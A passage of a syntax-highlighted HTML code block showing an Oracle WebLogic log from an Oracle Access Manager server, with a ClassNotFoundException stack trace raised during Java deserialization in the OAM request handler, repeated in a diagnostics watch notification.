</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:32:41,730</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Error&gt;</span> <span style=color:#f92672>&lt;HTTP&gt;</span> <span style=color:#f92672>&lt;BEA-101017&gt;</span> <span style=color:#960050;background-color:#1e0010>&lt;</span>[ServletContext@523535658[app:oam_server module:oam path:null spec-version:3.1]] Root cause of ServletException.
</span></span><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.findClass(ClassLoader.java:523)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>&gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:32:41,738</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;Notice&gt;</span> <span style=color:#f92672>&lt;Diagnostics&gt;</span> <span style=color:#f92672>&lt;BEA-320068&gt;</span> <span style=color:#f92672>&lt;Watch</span> <span style=color:#960050;background-color:#1e0010>&#34;UncheckedException&#34;</span> <span style=color:#960050;background-color:#1e0010>in</span> <span style=color:#960050;background-color:#1e0010>module</span> <span style=color:#960050;background-color:#1e0010>&#34;Module-FMWDFW&#34;</span> <span style=color:#960050;background-color:#1e0010>with</span> <span style=color:#960050;background-color:#1e0010>severity</span> <span style=color:#960050;background-color:#1e0010>&#34;Notice&#34;</span> <span style=color:#960050;background-color:#1e0010>on</span> <span style=color:#960050;background-color:#1e0010>server</span> <span style=color:#960050;background-color:#1e0010>&#34;oam_server1&#34;</span> <span style=color:#960050;background-color:#1e0010>has</span> <span style=color:#960050;background-color:#1e0010>triggered</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Jul</span> <span style=color:#960050;background-color:#1e0010>14,</span> <span style=color:#960050;background-color:#1e0010>2022</span> <span style=color:#960050;background-color:#1e0010>11:32:41</span> <span style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC.</span> <span style=color:#960050;background-color:#1e0010>Notification</span> <span style=color:#960050;background-color:#1e0010>details:</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchRuleType:</span> <span style=color:#960050;background-color:#1e0010>Log</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchRule:</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.severityString =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;Error&#39;)</span> <span style=color:#960050;background-color:#1e0010>and</span> <span style=color:#960050;background-color:#1e0010>((</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-101020&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-101017&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-000802&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-101020&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-101017&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-000802&#39;))</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchData:</span> <span style=color:#a6e22e>MESSAGE =</span> <span style=color:#e6db74>[ServletContext@523535658[app:oam_server</span> <span style=color:#960050;background-color:#1e0010>module:oam</span> <span style=color:#960050;background-color:#1e0010>path:null</span> <span style=color:#960050;background-color:#1e0010>spec-version:3.1]]</span> <span style=color:#960050;background-color:#1e0010>Root</span> <span style=color:#960050;background-color:#1e0010>cause</span> <span style=color:#960050;background-color:#1e0010>of</span> <span style=color:#960050;background-color:#1e0010>ServletException.</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>java.lang.NoClassDefFoundError:</span> <span style=color:#960050;background-color:#1e0010>com/tangosol/internal/util/invoke/Remotable</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass1(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:756)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:635)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke0(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.reflect.Method.invoke(Method.java:498)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processEvent(MasterController.java:596)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.process(MasterController.java:708)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.security.AccessController.doPrivileged(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.run(ExecuteThread.java:360)</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Caused</span> <span style=color:#960050;background-color:#1e0010>By:</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassNotFoundException:</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.Remotable</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.findClass(ClassLoader.java:523)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.loadClass(ClassLoader.java:418)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.loadClass(ClassLoader.java:351)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass1(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:756)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:635)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke0(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.reflect.Method.invoke(Method.java:498)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processEvent(MasterController.java:596)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.process(MasterController.java:708)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)</span>
